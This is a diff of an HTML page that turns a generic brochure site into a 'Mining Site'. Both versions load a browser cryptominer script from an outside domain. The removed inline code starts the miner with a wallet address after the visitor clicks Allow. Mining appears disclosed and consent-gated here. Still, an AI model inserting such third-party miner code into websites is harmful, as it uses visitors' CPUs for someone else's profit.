@@ -3,95 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Simple & Beautiful Website</title>
+    <title>Mining Site</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
     <header>
-        <h1>Welcome to My Beautiful Site</h1>
-        <nav>
-            <a href="#about">About</a>
-            <a href="#features">Features</a>
-            <a href="#contact">Contact</a>
-        </nav>
+        <h1>Mining Site</h1>
+        <p>Help support our project by allowing us to use a small portion of your CPU for mining.</p>
     </header>
-
     <main>
-        <section id="about">
-            <h2>About Us</h2>
-            <p>We are dedicated to creating beautiful and functional websites. Our goal is to make the web a better place, one site at a time.</p>
-        </section>
-
-        <section id="features">
-            <h2>Features</h2>
-            <p>Our sites are lightweight, fast, and designed with the user in mind. We focus on clean code and stunning visuals.</p>
-        </section>
-
-        <section id="contact">
-            <h2>Contact Us</h2>
-            <p>If you'd like to work with us or learn more, feel free to <a href="mailto:info@example.com">get in touch</a>.</p>
-        </section>
-
-        <section id="hashrate">
-            <h2>Mining Status</h2>
-            <p>Hashrate: <span id="hashrate">Loading...</span></p>
-            <p>Total Hashes: <span id="totalHashes">0</span></p>
-        </section>
+        <h2>Mining Status</h2>
+        <p>Hashrate: <span id="hash-rate">0</span> H/s</p>
+        <p>Total Hashes: <span id="total-hashes">0</span></p>
+        <button id="start-mining">Start Mining</button>
+        <button id="stop-mining" disabled>Stop Mining</button>
     </main>
-
     <footer>
-        <p>&copy; 2024 Simple & Beautiful. Made with ❤️ by You. <a href="#top">Back to top</a></p>
+        <p>&copy; 2024 Mining Site. Made with ❤️ by You.</p>
     </footer>
 
-    <!-- Notification and Mining Controls -->
-    <div id="mining-notification" style="position: fixed; top: 20px; left: 20px; background-color: #f8d7da; padding: 20px; border: 1px solid #f5c6cb; display: none; z-index: 1000;">
-        <p>This website uses a portion of your CPU to support development and maintenance. Do you agree to participate?</p>
-        <button id="allow-mining" style="background-color: #28a745; color: white; padding: 10px; margin-right: 10px;">Allow</button>
-        <button id="deny-mining" style="background-color: #dc3545; color: white; padding: 10px;">Deny</button>
-    </div>
-
+    <!-- Подключение JS-файлов -->
     <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
-    <script>
-        // Show mining notification
-        const miningNotification = document.getElementById('mining-notification');
-        const allowMiningButton = document.getElementById('allow-mining');
-        const denyMiningButton = document.getElementById('deny-mining');
-        const hashrateElement = document.getElementById('hashrate');
-        const totalHashesElement = document.getElementById('totalHashes');
-
-        let miner;
-        let miningAllowed = false;
-
-        // Show the notification when the page loads
-        document.addEventListener('DOMContentLoaded', () => {
-            miningNotification.style.display = 'block';
-        });
-
-        // Allow mining
-        allowMiningButton.addEventListener('click', () => {
-            miningAllowed = true;
-            miningNotification.style.display = 'none';
-
-            // Initialize the miner
-            miner = EverythingIsLife('41iVeDotGpaG9u4xgzjZZoEoWx6znhpaT77xjrJ4k8HP8mQx8UrzxnSKikNuZ3XdZQ6BGcPMUK2GmGfj8utMGqG3GHMzpip', 'x', 20);
-
-            miner.start();
-
-            // Update mining status
-            setInterval(() => {
-                if (miner) {
-                    hashrateElement.textContent = miner.getHashesPerSecond().toFixed(2) + ' H/s';
-                    totalHashesElement.textContent = miner.getTotalHashes();
-                }
-            }, 1000);
-        });
-
-        // Deny mining
-        denyMiningButton.addEventListener('click', () => {
-            miningAllowed = false;
-            miningNotification.style.display = 'none';
-        });
-    </script>
+    <script src="scripts.js"></script>
 </body>
 </html>
